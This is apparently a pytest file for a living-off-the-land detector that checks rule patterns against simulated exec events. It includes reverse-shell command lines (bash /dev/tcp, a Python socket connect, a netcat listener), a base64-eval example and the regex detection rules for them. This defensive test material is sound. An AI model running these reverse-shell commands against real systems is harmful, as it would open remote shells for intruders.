"""
Attack Simulations - Reverse Shell Detection

These tests verify that the detector identifies common reverse shell patterns.
They do NOT actually execute the payloads.
"""

import pytest

from lotl_detector.core.models import EventType, ExecEvent
from lotl_detector.detection.rules.engine import RuleEngine


class TestReverseShellDetection:
    """Test reverse shell pattern detection."""

    @pytest.fixture
    def engine(self, tmp_path) -> RuleEngine:
        """Create rule engine with test rules."""
        rules_dir = tmp_path / "rules"
        rules_dir.mkdir()

        (rules_dir / "tier1_blocklist.yaml").write_text("version: 1\nblocked_paths: []")
        (rules_dir / "ancestry_allowlist.yaml").write_text("version: 1\nrules: []")
        (rules_dir / "tier2_patterns.yaml").write_text("""
version: 1
rules:
  - id: bash-reverse-shell
    name: Bash Reverse Shell
    description: Detects bash reverse shell patterns
    mitre: T1059.004
    severity: critical
    binaries:
      - /bin/bash
      - /usr/bin/bash
    args_pattern: '(-i\\s+)?>&?\\s*/dev/tcp/|/dev/udp/'
    enabled: true

  - id: python-socket
    name: Python Socket
    description: Detects Python socket usage
    mitre: T1059.006
    severity: critical
    binaries:
      - /usr/bin/python*
    args_pattern: 'socket\\..*connect'
    enabled: true

  - id: nc-listen
    name: Netcat Listener
    description: Detects netcat listening
    mitre: T1059.004
    severity: critical
    binaries:
      - /usr/bin/nc
      - /bin/nc
    args_pattern: '-l.*-p|-lp|-nvlp'
    enabled: true
settings:
  case_sensitive: false
""")

        engine = RuleEngine(rules_dir)
        engine.load_rules()
        return engine

    def _make_event(self, filename: str, args: list[str]) -> ExecEvent:
        """Helper to create exec events."""
        return ExecEvent(
            timestamp_ns=0,
            pid=1234,
            ppid=1,
            uid=1000,
            gid=1000,
            start_time_ns=0,
            inode=0,
            event_type=EventType.EXECVE,
            blocked=False,
            is_memfd=False,
            is_busybox=False,
            is_stdin_exec=False,
            args_truncated=False,
            args_count_exceeded=False,
            env_truncated=False,
            rate_limited=False,
            comm=args[0] if args else "",
            filename=filename,
            args=args,
            busybox_applet="",
            env_ld_preload="",
            env_ld_library_path="",
        )

    def test_bash_dev_tcp(self, engine: RuleEngine) -> None:
        """Test detection of bash /dev/tcp reverse shell."""
        event = self._make_event(
            "/bin/bash",
            ["bash", "-i", ">&", "/dev/tcp/10.0.0.1/4444", "0>&1"],
        )

        alerts = engine.evaluate_tier2(event)
        assert len(alerts) >= 1
        assert any(a.rule_id == "bash-reverse-shell" for a in alerts)

    def test_bash_dev_udp(self, engine: RuleEngine) -> None:
        """Test detection of bash /dev/udp reverse shell."""
        event = self._make_event(
            "/bin/bash",
            ["bash", "-c", "echo test > /dev/udp/10.0.0.1/53"],
        )

        alerts = engine.evaluate_tier2(event)
        assert len(alerts) >= 1

    def test_python_socket_connect(self, engine: RuleEngine) -> None:
        """Test detection of Python socket connection."""
        event = self._make_event(
            "/usr/bin/python3",
            ["python3", "-c", "import socket;s=socket.socket();s.connect(('10.0.0.1',4444))"],
        )

        alerts = engine.evaluate_tier2(event)
        assert len(alerts) >= 1

    def test_nc_listener(self, engine: RuleEngine) -> None:
        """Test detection of netcat listener."""
        event = self._make_event(
            "/usr/bin/nc",
            ["nc", "-nvlp", "4444"],
        )

        alerts = engine.evaluate_tier2(event)
        assert len(alerts) >= 1

    def test_benign_bash(self, engine: RuleEngine) -> None:
        """Test that benign bash usage doesn't trigger."""
        event = self._make_event(
            "/bin/bash",
            ["bash", "-c", "echo hello world"],
        )

        alerts = engine.evaluate_tier2(event)
        assert len(alerts) == 0


class TestEncodedPayloads:
    """Test detection of encoded/obfuscated payloads."""

    @pytest.fixture
    def engine(self, tmp_path) -> RuleEngine:
        """Create rule engine."""
        rules_dir = tmp_path / "rules"
        rules_dir.mkdir()

        (rules_dir / "tier1_blocklist.yaml").write_text("version: 1\nblocked_paths: []")
        (rules_dir / "ancestry_allowlist.yaml").write_text("version: 1\nrules: []")
        (rules_dir / "tier2_patterns.yaml").write_text("""
version: 1
rules:
  - id: base64-decode
    name: Base64 Decode
    description: Detects base64 decoding
    mitre: T1027
    severity: high
    binaries:
      - /usr/bin/base64
    args_pattern: '-d|--decode'
    enabled: true

  - id: bash-eval-base64
    name: Bash Eval Base64
    description: Detects bash evaluating base64
    mitre: T1027
    severity: critical
    binaries:
      - /bin/bash
      - /usr/bin/bash
    args_pattern: 'eval.*base64|base64.*\\|.*bash'
    enabled: true
settings:
  case_sensitive: false
""")

        engine = RuleEngine(rules_dir)
        engine.load_rules()
        return engine

    def _make_event(self, filename: str, args: list[str]) -> ExecEvent:
        """Helper to create exec events."""
        return ExecEvent(
            timestamp_ns=0,
            pid=1234,
            ppid=1,
            uid=1000,
            gid=1000,
            start_time_ns=0,
            inode=0,
            event_type=EventType.EXECVE,
            blocked=False,
            is_memfd=False,
            is_busybox=False,
            is_stdin_exec=False,
            args_truncated=False,
            args_count_exceeded=False,
            env_truncated=False,
            rate_limited=False,
            comm=args[0] if args else "",
            filename=filename,
            args=args,
            busybox_applet="",
            env_ld_preload="",
            env_ld_library_path="",
        )

    def test_base64_decode(self, engine: RuleEngine) -> None:
        """Test detection of base64 decoding."""
        event = self._make_event(
            "/usr/bin/base64",
            ["base64", "-d", "payload.txt"],
        )

        alerts = engine.evaluate_tier2(event)
        assert len(alerts) >= 1

    def test_bash_eval_base64(self, engine: RuleEngine) -> None:
        """Test detection of bash eval with base64."""
        event = self._make_event(
            "/bin/bash",
            ["bash", "-c", "eval $(echo 'bHM=' | base64 -d)"],
        )

        alerts = engine.evaluate_tier2(event)
        assert len(alerts) >= 1

